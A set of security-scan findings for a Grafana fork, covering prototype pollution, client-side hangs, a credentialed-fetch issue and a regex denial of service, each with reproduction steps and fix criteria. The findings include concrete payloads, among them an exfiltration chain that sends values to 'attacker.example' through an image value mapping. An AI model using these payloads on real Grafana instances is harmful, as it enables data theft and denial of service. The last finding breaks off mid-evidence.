# natel-discrete-panel auto-migration writes Object.prototype.text from dashboard JSON valueMaps on load

## Details
The state-timeline panel registers timelinePanelChangedHandler via setPanelChangeHandler (module.tsx:23) as its onPanelTypeChanged hook. When prevPluginId is `natel-discrete-panel` it converts legacy options into value mappings (public/app/plugins/panel/state-timeline/migrations.ts:23-90). It builds `const valuemap: ValueMap = { type: ValueToText, options: {} }` — a prototype-bearing plain object — and for each `oldOptions.valueMaps` entry does `let old = valuemap.options[value]; if (old) { old.text = text; } else { valuemap.options[value] = { text }; }` (lines 51-64). When the stored `value` is `__proto__` the lookup resolves through the prototype chain to Object.prototype, which is truthy, so `old.text = text` creates an own, enumerable `Object.prototype.text` holding the attacker-chosen string; `constructor` likewise writes `Object.text`. No Object.hasOwn check, key filter or null-prototype container exists.

The handler is not confined to an Editor switching visualizations: `natel-discrete-panel` is in autoMigrateAngular (PanelModel.ts:125-133), so PanelModel.restoreModel (via getPanelPluginToMigrateTo) sets autoMigrateFrom and rewrites the type to state-timeline on every dashboard load. restoreModel copies every persisted JSON property onto the model and getOptionsToRemember (PanelModel.ts:364-372) returns all of them except mustKeepProps, so the root-level `valueMaps` array reaches the handler as `{ angular: oldOptions }`. Both the legacy PanelModel.pluginLoaded path (PanelModel.ts:402-420 → callPanelTypeChangeHandler) and the Scenes path (angularMigration.ts:53-61, wired for every panel at transformSaveModelToScene.ts:504 as _UNSAFE_customMigrationHandler, which @grafana/scenes VizPanel._pluginLoaded invokes before onPanelMigration — recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map, VizPanel.js:271-287) call it as soon as the state-timeline plugin loads. DashboardMigrator runs after PanelModel construction (DashboardModel.ts:162 vs 174) and does not touch root-level valueMaps.

So opening a dashboard containing a panel of type `natel-discrete-panel` with `valueMaps: [{"value": "__proto__", "text": "<attacker string>"}]` pollutes Object.prototype in the victim's SPA session for the rest of that session, for Viewers and Admins alike.

Impact: only the fixed key `text` is injected, but its value is attacker-controlled and the key is widely read. @grafana/data's display processor (recovered from 6540.a30454ce5fbe65a84f5f.js.map, displayProcessor.ts / valueMappings.ts) does `const mappingResult = vm.options[value]; if (mappingResult.text != null) text = mappingResult.text;`, so any color-only value mapping on any later dashboard renders the attacker string instead of the real value; for-in loops over arbitrary objects also enumerate `text`. No dangerouslySetInnerHTML / renderMarkdown consumer reading `.text` from objects lacking it was found in public/app, so this is a low-integrity prototype-pollution defect — same class as the verified filter-by-name editor record, but with an attacker-chosen string and a load-time trigger reaching passive viewers.

The colorMaps branch (lines 42-49, `valuemap.options[p.text] = { color }`) with text `__proto__` only re-parents the local options object. The graph→timeseries/histogram migrations in this unit use Object.keys/Object.entries into fresh objects and are unaffected.

## Evidence
1. [public/app/plugins/panel/state-timeline/migrations.ts:51–63](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/state-timeline/migrations.ts#L51-L63)
   For each old valueMaps entry, `let old = valuemap.options[value]; if (old) { old.text = text; }`. valuemap.options is a plain `{}` (line 39), so value === '__proto__' resolves through the prototype chain to Object.prototype (truthy), the create branch is skipped and `old.text = text` creates Object.prototype.text with the attacker's string; value === 'constructor' writes Object.text. No Object.hasOwn / null-prototype guard exists. This is the code the fix must change.
2. [public/app/plugins/panel/state-timeline/migrations.ts:15–26](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/state-timeline/migrations.ts#L15-L26)
   timelinePanelChangedHandler runs this block whenever prevPluginId === 'natel-discrete-panel' and prevOptions.angular is set; oldOptions is the persisted JSON of the old panel, so valueMaps[].text/value are dashboard-JSON controlled.
3. [public/app/features/dashboard/state/PanelModel.ts:125–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/state/PanelModel.ts#L125-L133)
   autoMigrateAngular maps 'natel-discrete-panel' to 'state-timeline', so the migration is not an Editor-only visualization switch: restoreModel (lines 238-243, via getPanelPluginToMigrateTo.ts:3-26) sets autoMigrateFrom on every load of a dashboard containing such a panel, and pluginLoaded (lines 403-420) calls the handler with { angular: getOptionsToRemember() } as soon as the state-timeline plugin loads.
4. [public/app/features/dashboard-scene/serialization/angularMigration.ts:53–60](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/angularMigration.ts#L53-L60)
   The Scenes dashboard path does the same: getAngularPanelMigrationHandler calls plugin.onPanelTypeChanged(panel, 'natel-discrete-panel', { angular: oldOptions }, fieldConfig) when the panel's plugin loads; it is wired for every panel in transformSaveModelToScene.ts:504 (_UNSAFE_customMigrationHandler).
5. [public/app/features/dashboard/state/getPanelPluginToMigrateTo.ts:3–25](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/state/getPanelPluginToMigrateTo.ts#L3-L25)
   Resolves the auto-migration target from autoMigrateAngular for any stored panel type, confirming the handler fires on plain dashboard load for Viewers as well as Editors.

## Impact
A single fixed property (`text`) with an attacker-chosen string is injected into Object.prototype for the SPA session: value-mapping display falls through to it (color-only mappings show attacker text on every later dashboard), and for-in enumerations see an extra key. No confidentiality impact and no code-execution gadget identified; application behaviour is corrupted in limited, attacker-visible ways.

## Reproduction steps
1. Attacker: authenticated Editor (threat-model adversary 3) who stores a dashboard containing a `natel-discrete-panel` panel with a valueMaps entry whose value is `__proto__` (dashboard JSON model editor, import or API; v1 dashboards accept any panel type). Victim: any user who opens the dashboard - the auto-migration runs in their browser on load and writes Object.prototype.text. No further interaction, no security mechanism to defeat, default configuration.

## Recommended fix
The migration indexes a prototype-bearing plain object with dashboard-JSON-controlled keys and mutates whatever the lookup returns, so `__proto__`/`constructor` keys reach Object.prototype / Object. Fix criteria: Key lookups and writes in the migration must only touch own properties of the mapping object (null-prototype container or Object.hasOwn checks, rejecting `__proto__`, `constructor` and `prototype` keys). Verify that loading a dashboard with a natel-discrete-panel whose valueMaps/colorMaps use `__proto__` or `constructor` as value/text leaves Object.prototype and Object unchanged and still produces a valid ValueToText mapping for ordinary keys.

---
**Severity:** LOW
**Status:** Open
**Category:** Prototype pollution
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256342

---

# Unbounded backward keyword walks in CloudWatch Logs SQL getStatementPosition hang the browser on completion

## Details
`getStatementPosition` for the CloudWatch Logs SQL language (language/cloudwatch-logs-sql/completion/statementPosition.ts) contains four `while` loops that walk backwards through the LinkedToken list looking for a WHERE/HAVING/ON/CASE/WHEN keyword (lines 161-164, 204-207, 274-277) or a CASE keyword (lines 336-338). `LinkedToken.getPreviousKeyword()` (monarch/LinkedToken.ts:127-136) returns null when the list is exhausted; the loops then compute `nearestPreviousKeyword?.getPreviousKeyword()` → undefined and `?.value.toUpperCase() || ''` → '' (or undefined for the CASE loop), the loop condition stays true, and the loop spins forever on the main thread. The entry conditions are met by ordinary text: TRUE, FALSE, NULL and END are Monarch keywords (language.ts KEYWORDS list, tokenizer `@keywords` → 'keyword'), so with the cursor on whitespace after `TRUE`, `FALSE` or `NULL` (e.g. `SELECT TRUE ` or `TRUE` followed by blank lines) and no WHERE/HAVING/ON/CASE/WHEN earlier in the query, line 156 is reached and the first loop never exits; `END ` with no earlier CASE reaches line 336 (and would dereference null at line 339 if it did exit).

Reachability: `provideCompletionItems` (monarch/CompletionItemProvider.ts:78-79) tokenises the model with linkedTokenBuilder and calls `getStatementPosition` synchronously before its first await. The Logs SQL editor (components/QueryEditor/LogsQueryEditor/code-editors/SQLCodeEditor.tsx:51) registers `editor.onDidFocusEditorText(() => editor.trigger('editor.action.triggerSuggest'))`, so the provider runs as soon as the editor receives focus while a provider is registered (the first click after mount; after a blur the provider is disposed and re-registered asynchronously on focus, so from then on the next space typed — ' ' is a trigger character, CompletionItemProvider.ts:74 — or any later focus invokes it). linkedTokenBuilder assigns the last token whose range contains the cursor, so clicking past the end of a line or on an empty line selects a whitespace token. The query text comes from the query model: an unauthenticated attacker can supply it through an Explore URL (`panes[..].queries[]` with `datasource` naming the CloudWatch datasource, `queryMode: 'Logs'`, `queryLanguage: 'SQL'`, `expression: 'SELECT TRUE\n\n\n'`; v1 migrator keeps `queries` verbatim, synchronizer/init.ts seeds the pane with them, QueryRows → QueryEditorRows → CloudWatch QueryEditor → LogsQueryEditor → LogsQueryField.getCodeEditor → SQLQueryEditor), or an Editor can persist it in a dashboard panel that another Editor/Admin opens in the panel editor. Per docs/sources/administration/roles-and-permissions, Explore is available to Editors and Admins, so the Explore victim is a logged-in Editor/Admin of an org with a CloudWatch datasource. A victim who clicks into the whitespace of the query editor (or types a space there) has the Grafana tab hang indefinitely and must kill it, losing unsaved work. The same defect hits legitimate users typing `SELECT TRUE ` before a WHERE clause.

The PPL, CWLI, Metrics-Insights SQL and metric-math getStatementPosition implementations do not contain unbounded loops; only the Logs SQL variant is affected.

Assumptions (dependencies not in the checkout): @grafana/ui CodeEditor (recovered from public/build/6540.*.js.map) passes the real Monaco editor to onEditorDidMount and wires onFocus/onBlur via the wrapping div's React focus events; Monaco (pinned by the frontend's package manifest) fires onDidFocusEditorText synchronously on the DOM focus event, runs `editor.action.triggerSuggest` synchronously when a completion provider is registered, and invokes providers for its documented triggerCharacters; `Range.containsPosition` is end-inclusive as in the project's own mock (mocks/monarch/Monaco.ts:111-117).

## Evidence
1. [public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts:153–177](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts#L153-L177)
   When the cursor is on whitespace (or ')') after a NULL/TRUE/FALSE keyword, or after AND/OR whose previous keyword is one of them, this block walks backwards with `while (![WHERE, HAVING, ON, CASE, WHEN].includes(value))` calling getPreviousKeyword(). If no such keyword exists earlier in the query, nearestPreviousKeyword becomes null then undefined, `?.value.toUpperCase() || ''` yields '' which is never in the list, and the loop never terminates.
2. [public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts:198–220](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts#L198-L220)
   Same unbounded while-loop for the case where the previous keyword is NULL/TRUE/FALSE and the previous non-whitespace token is a predicate operator.
3. [public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts:268–276](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts#L268-L276)
   Third unbounded while-loop, entered when the previous keyword is NULL/TRUE/FALSE and the token before it is a predicate operator.
4. [public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts:334–345](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/completion/statementPosition.ts#L334-L345)
   Fourth loop: `while (CASE !== nearestCaseKeyword?.value.toUpperCase())` after an END keyword with no CASE anywhere before it never terminates (undefined !== 'CASE'), and line 339 would dereference a null nearestCaseKeyword if it did.
5. [public/app/plugins/datasource/cloudwatch/language/monarch/LinkedToken.ts:127–136](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/monarch/LinkedToken.ts#L127-L136)
   getPreviousKeyword() returns null once the token list is exhausted; none of the four loops in statementPosition.ts test for that null, so the exhausted state is absorbed by optional chaining instead of ending the loop.
6. [public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/language.ts:58–105](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/cloudwatch-logs-sql/language.ts#L58-L105)
   TRUE, FALSE, NULL and END are in KEYWORDS and tokenised as 'keyword' by the Monarch `@keywords` case, so the entry conditions of the loops are met by ordinary query text such as `SELECT TRUE ` with the cursor on the trailing whitespace.
7. [public/app/plugins/datasource/cloudwatch/language/monarch/CompletionItemProvider.ts:73–80](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/language/monarch/CompletionItemProvider.ts#L73-L80)
   provideCompletionItems is registered with ' ' among its triggerCharacters, tokenises the whole model and calls this.getStatementPosition(currentToken) synchronously on the main thread before its first await; a non-terminating getStatementPosition blocks the page.
8. [public/app/plugins/datasource/cloudwatch/components/QueryEditor/LogsQueryEditor/code-editors/SQLCodeEditor.tsx:49–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/components/QueryEditor/LogsQueryEditor/code-editors/SQLCodeEditor.tsx#L49-L56)
   The Logs SQL editor programmatically triggers suggestions on focus of the editor text (onDidFocusEditorText → editor.trigger('editor.action.triggerSuggest')), so the completion provider — and getStatementPosition — run as soon as the user clicks into the editor while a provider is registered, without typing anything.
9. [public/app/plugins/datasource/cloudwatch/components/QueryEditor/LogsQueryEditor/LogsQueryField.tsx:98–102](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/components/QueryEditor/LogsQueryEditor/LogsQueryField.tsx#L98-L102)
   getCodeEditor selects SQLQueryEditor purely from query.queryLanguage === 'SQL' on the stored/URL-supplied query object; no feature toggle or validation gates it.
10. [public/app/features/explore/hooks/useStateSync/synchronizer/init.ts:43–50](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/synchronizer/init.ts#L43-L50)
   Explore seeds each pane's queries verbatim from the URL `panes` parameter (withUniqueRefIds(queries)), so an attacker-authored CloudWatch Logs SQL query object reaches the datasource's query editor for any Editor/Admin who opens the link.

## Impact
The victim's Grafana browser tab becomes permanently unresponsive and must be killed; unsaved edits in that tab are lost. No data is disclosed or modified and the server is unaffected.

## Reproduction steps
1. An attacker with no Grafana privileges crafts an Explore URL for an instance with a CloudWatch datasource (name/uid guessable; the default name is 'CloudWatch') containing a Logs SQL query whose expression is e.g. `SELECT TRUE` followed by blank lines, and sends it to a logged-in Editor/Admin (Explore is granted to Editor and Admin per the roles docs); alternatively an Editor stores the query in a dashboard panel that another Editor/Admin opens in the panel editor. The victim must perform one further specific interaction with the payload — click into the editor's whitespace or type a space there — after which the completion provider runs getStatementPosition and the tab hangs in an unbounded loop. No defence must be bypassed and no non-default configuration is required.

## Recommended fix
Backward keyword searches in getStatementPosition assume a WHERE/HAVING/ON/CASE/WHEN (or CASE) keyword always exists earlier in the query and loop until found, with no termination when the token list is exhausted — violating the requirement that editor callbacks terminate for any input. Fix criteria: Every backward walk must terminate when getPreviousKeyword() returns null/undefined (returning StatementPosition.Unknown or a sensible default) and must not dereference a null result afterwards. Verify that completion on queries `TRUE `, `NULL AND `, `x = TRUE `, and `END ` (cursor on trailing whitespace) returns promptly in the Logs SQL editor, and add unit tests for getStatementPosition with no enclosing clause keyword.

---
**Severity:** LOW
**Status:** Open
**Category:** Infinite loop
**CWE:** [CWE-835](https://cwe.mitre.org/data/definitions/835.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256341

---

# TestData streaming fetch scenario makes every viewer's browser request an arbitrary dashboard-chosen URL

## Details
The bundled TestData datasource (public/app/plugins/datasource/grafana-testdata-datasource, shipped as dist/module.js and documented as 'bundled with Grafana ... ready to use out of the box') has a `streaming_client` scenario whose `stream.type = 'fetch'` variant runs entirely in the browser of whoever renders the panel. `runFetchStream()` (runStreams.ts:329) executes `fetch(new Request(query.url))` with `query.url` copied verbatim from the panel's saved query; the only check is that it is non-empty. The docs describe the field as 'URL of a remote CSV endpoint to stream incrementally', but nothing restricts scheme, host or path, so a dashboard author (Editor) picks any URL and every viewer's browser requests it, zero-click, each time the dashboard is rendered or refreshed.

Because `new Request(url)` defaults to credentials 'same-origin', a same-origin URL (`/api/org/users`, `/api/admin/settings`, `/api/serviceaccounts`, `/api/datasources/uid/<uid>`, `/api/datasources/proxy/uid/<uid>/...`, `/` with its grafanaBootData, `/metrics`, `/logout`) is sent with the viewer's grafana_session cookie, and the response body is streamed through CSVReader into a CircularDataFrame that the panel renders. The viewer's browser thus acts as a confused deputy: an Editor obtains, from a higher-privileged viewer (org Admin / server Admin) who opens the dashboard, responses the Editor cannot request directly. The author then exfiltrates them with ordinary field configuration — e.g. a table with the field's cell type set to Image and a Regex value mapping `(.*)` -> `https://attacker.example/?d=$1`: @grafana/data applies `value.replace(regex, result.text)` and the ImageCell renders `<img src={display(value).text}>`, so each captured value is sent to the attacker without any click (the default CSP template, which is off by default anyway, allows `img-src *`). CSV parsing is lossy: a compact single-line JSON body whose first token is a string becomes header names only, while multi-line bodies (HTML, pretty JSON, text) and any body delivered in more than one stream chunk become rows; so what leaks depends on the response shape, which bounds confidentiality to LOW.

What this adds beyond what the project concedes to an Editor: image/data-link URLs already let an author make viewers' browsers contact arbitrary cross-origin hosts, and the sibling 'Grafana API' scenario (datasource.ts:488-504, a distinct sink recorded separately as testdata-grafana-api-forced-authenticated-get) offers in its editor only a fixed select of Data Sources / Search / Annotations endpoints and is confined to the /api/ prefix via backendSrv. The fetch path alone lets the author choose ANY same-origin path (not confined to /api/, any response content type) and read it back as panel data in the viewer's security context. `stream.url` is not template-interpolated, so `${__user.*}` cannot be embedded in the URL; viewer identity leaks via the same-origin render-and-exfiltrate chain (e.g. grafanaBootData.user in the index page) and via IP/User-Agent to cross-origin hosts. The fetch is never aborted on unsubscribe, so a long-lived attacker stream keeps the reader alive for the tab's life.

Preconditions: a TestData datasource instance exists in the org (the plugin is bundled and loaded by default; an Admin must add an instance, which is common for demo/prototyping) and the victim renders the author's dashboard. Public dashboards do not reach this code (their queries run in the backend plugin). Assumed dependency behaviour: @grafana/data CSVReader and value mappings and @grafana/ui ImageCell as recovered from the shipped source map public/build/6540.a30454ce5fbe65a84f5f.js.map (packages not present in checkout).

## Evidence
1. [public/app/plugins/datasource/grafana-testdata-datasource/runStreams.ts:325–334](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/runStreams.ts#L325-L334)
   runFetchStream() calls `fetch(new Request(query.url))` with the URL taken verbatim from the saved query (target.stream.url). Only emptiness is checked; there is no scheme/host/path restriction. Per the browser Fetch standard, `new Request(url)` defaults to mode 'cors' and credentials 'same-origin', so a same-origin path such as '/api/org/users' is sent with the viewer's grafana_session cookie and its body is readable; a cross-origin URL is contacted from the viewer's network position (response readable only if the host sends permissive CORS). The fetch is never aborted on unsubscribe (lines 336-339).
2. [public/app/plugins/datasource/grafana-testdata-datasource/runStreams.ts:263–323](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/runStreams.ts#L263-L323)
   Each body chunk is decoded and passed to @grafana/data CSVReader.readCSV(); onHeader/onRow callbacks copy header names and rows into a CircularDataFrame that is emitted as panel data. Parsing is lossy (a first line whose first cell is a string becomes the header; later lines, and every later chunk, become rows with comma-split columns), so multi-line or multi-chunk same-origin responses (HTML pages incl. the index page's grafanaBootData, pretty-printed or large JSON, text endpoints) land as string values that the author's field configuration then renders.
3. [public/app/plugins/datasource/grafana-testdata-datasource/runStreams.ts:34–51](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/runStreams.ts#L34-L51)
   runStream() dispatches on query.type === 'fetch' taken from the saved query (lodash defaults(target.stream, defaultStreamQuery)); the saved dashboard JSON fully controls type and url.
4. [public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts:112–113](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts#L112-L113)
   query() routes every non-hidden 'streaming_client' target to runStream() in the browser of whoever renders the panel (dashboard, Explore, embed); this is the entry point from dashboard JSON. TestData defines no filterQuery(), so runRequest.ts passes the saved targets through unchanged; resolveTemplateVariables() (lines 177-200) does not touch stream.url.
5. [public/app/plugins/datasource/grafana-testdata-datasource/components/StreamingClientEditor.tsx:71–81](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/components/StreamingClientEditor.tsx#L71-L81)
   The editor exposes the URL as a free-text input with no validation and persists it into the query model (stream.url); the saved JSON can in any case be edited directly.

## Impact
Confidentiality LOW: same-origin authenticated responses readable only by a higher-privileged viewer (org user list, admin settings, service accounts, datasource configuration, the viewer's own identity in grafanaBootData) are rendered under the author's field configuration and can be exfiltrated through Image cells; the CSV parser is lossy and chunk-dependent, so disclosure is partial and response-shape dependent rather than a reliable full read. Viewer presence, IP and User-Agent are also disclosed to an attacker host, though image URLs already concede that. Integrity NONE: only GETs without custom headers are issued (side-effect GETs such as /logout are nuisance-level). Availability NONE. Side effects on intranet hosts reachable from the viewer's browser are the same as any author-supplied image URL and are not rated.

## Reproduction steps
1. An authenticated Editor (PR:L) saves a dashboard whose TestData panel query is {scenarioId:'streaming_client', stream:{type:'fetch', url:'/api/org/users'}} with a table panel whose field is rendered as an Image cell under a Regex value mapping pointing at the attacker's host (or simply url:'https://attacker.example/x' as a beacon). Every user who opens the dashboard has their browser perform the credentialed GET immediately and on each refresh; the victim need only view the dashboard (UI:P). No protection has to be evaded (AC:L). The attack requires a TestData datasource instance to exist in the victim's org and a higher-privileged user to view the dashboard (AT:P).

## Recommended fix
1. runFetchStream() fetches a URL taken unvalidated from dashboard JSON, so the dashboard author controls the destination scheme, host and path of a credentialed request made by every viewer's browser, and the response body is handed back to author-controlled panel configuration. Fix criteria: The fetch scenario must not send viewer-browser requests to author-chosen destinations: either remove the URL option, restrict it to an exact-match allow-list of demo resources, or perform the fetch in the datasource backend (resource API) so the request originates from the server without the viewer's cookies and cannot target same-origin Grafana endpoints. Verify: a dashboard JSON with stream.url set to '/api/org/users' or to an external host produces no browser request to that URL when a viewer opens the dashboard.
2. The streaming fetch is never cancelled when the panel unsubscribes (runStreams.ts:336-339), so an author-chosen long-lived stream keeps reading in the viewer's tab. Fix criteria: The unsubscribe callback aborts the fetch (AbortController) and cancels the reader; verify that navigating away from the panel terminates the request.

---
**Severity:** LOW
**Status:** Open
**Category:** Resource injection
**CWE:** [CWE-99](https://cwe.mitre.org/data/definitions/99.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256307

---

# Heatmap X-bucket size from interpolated variable hits quadratic duration regex (ReDoS)

## Details
The heatmap panel ('Calculate from data' mode) and the 'Create heatmap' transformation size their X buckets from the string option xBuckets.value. Before use the string is template-variable interpolated: the panel does it explicitly (public/app/plugins/panel/heatmap/fields.ts:113 via props.replaceVariables = scenes VizPanel.interpolate), and the transformation pipeline does it for every string option (scenes SceneDataTransformer interpolates JSON.stringify(transformations); non-scenes transformDataFrame deepIterate()s options through ctx.interpolate — both recovered from the shipped source maps). In the default Size mode (fields.ts:199-214) calculateHeatmapFromData hands the interpolated string to convertDurationToMilliseconds (heatmap.ts:396-397).

convertDurationToMilliseconds (calculateHeatmap/utils.ts:123-142) tries three parsers in order. numberOrVariableValidator (transformers/utils.ts:138-151) and @grafana/data isValidDuration (durationutil.ts: one /(\d+)(.+)/ match per space-separated token plus a unit-table lookup) are linear and return false for a string such as '1111...1x' (digits followed by a character that is not a duration unit). The code then runs duration.match(/(\d+)ms$/i) (utils.ts:133). The regex has no start anchor and a greedy \d+ followed by a literal 'ms' that is absent, so a backtracking engine retries \d+ at every start offset and gives back one digit at a time: ~n^2/2 steps for n digits. Nothing bounds the length of the interpolated value and no runtime validation precedes the parser (AxisEditor validates only the author-time string '$var').

Attack paths (both need a dashboard whose heatmap X bucket size references a template variable, which AxisEditor.tsx:68-100 suggests as a sanctioned configuration):
1. Unauthenticated link-sender: /d/<uid>?var-xb=111...1x where xb is a textbox variable (scenes TextBoxVariable.updateFromUrl stores any string verbatim; DashboardScenePage.tsx:159 and PublicDashboardScenePage.tsx:73 wrap the dashboard in UrlSyncContextProvider). The heatmap panel interpolates it on first render and on every re-render (time range change, refresh). The hang is quadratic in the value length: ~10^4 characters cost tens of milliseconds, ~10^5 characters (an accepted URL on proxies with raised header buffers) tens of seconds, ~10^6 characters (Grafana exposed directly, Go's 1 MiB default request-header limit, no Grafana config key bounds it) minutes to over an hour in the viewer's tab.
2. Malicious or compromised datasource (threat-model adversary 4): a query variable referenced as $xb returns a multi-megabyte digit string as an option value; no URL limit applies. Scenes MultiValueVariable.getStateUpdateGivenNewOptions switches the current value to options[0] whenever the saved value/text is not among the returned options, so a datasource that returns only the crafted option makes every viewer of the dashboard hit the regex on load, with no link needed.

This is a different defect from the rejected heatmap-transform-variable-bucket-size-unbounded-allocation (initBins allocation at heatmap.ts:640): that record was rejected as non-ReDoS browser resource exhaustion, which the threat model excludes; this is a regular-expression backtracking blow-up on URL/datasource-controlled input, the class the threat model explicitly keeps in scope.

Assumptions on uninstalled dependencies: @grafana/data isValidDuration/parseDuration/transformDataFrame behave as recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map; @grafana/scenes TextBoxVariable, MultiValueVariable, VizPanel.interpolate and SceneDataTransformer behave as recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map; the Glob default formatter returns a single string value unchanged (formatRegistry.js). The browser regex engine is a backtracking engine without memoisation or a default step-limit fallback (V8 irregexp — its experimental non-backtracking engine is off by default — SpiderMonkey, JavaScriptCore). The server-side request-line limit is the Go net/http default of 1 MiB; the Go server is not in the checkout and conf/defaults.ini has no key for it.

## Evidence
1. [public/app/features/transformers/calculateHeatmap/utils.ts:123–141](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/calculateHeatmap/utils.ts#L123-L141)
   convertDurationToMilliseconds: after numberOrVariableValidator (Number() -> NaN, variableRegex finds no $/[[ token; linear) and @grafana/data isValidDuration (one /(\d+)(.+)/ match per space-separated token plus a unit lookup; linear, false for unit 'x') both return false, line 133 runs duration.match(/(\d+)ms$/i). The pattern is unanchored at the start with a greedy \d+ before a literal 'ms' that is absent, so a backtracking engine tries every start offset and gives back one digit at a time: ~n^2/2 steps for n digits followed by one non-unit character. No length bound applies to the string.
2. [public/app/plugins/panel/heatmap/fields.ts:109–122](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/heatmap/fields.ts#L109-L122)
   Heatmap panel entry ('Calculate from data' = options.calculate true): prepareHeatmapData interpolates calculation.xBuckets.value with props.replaceVariables (HeatmapPanel.tsx:40-53 passes the PanelProps replaceVariables, which in scenes is VizPanel.interpolate -> sceneGraph.interpolate) and hands it to calculateHeatmapFromData on every render (useMemo keyed on data, options, timeRange, replaceVariables).
3. [public/app/plugins/panel/heatmap/fields.ts:199–213](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/heatmap/fields.ts#L199-L213)
   getCalculationObjectWithDefaults makes HeatmapCalculationMode.Size the default X bucket mode, the branch that calls convertDurationToMilliseconds.
4. [public/app/features/transformers/calculateHeatmap/heatmap.ts:394–399](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/calculateHeatmap/heatmap.ts#L394-L399)
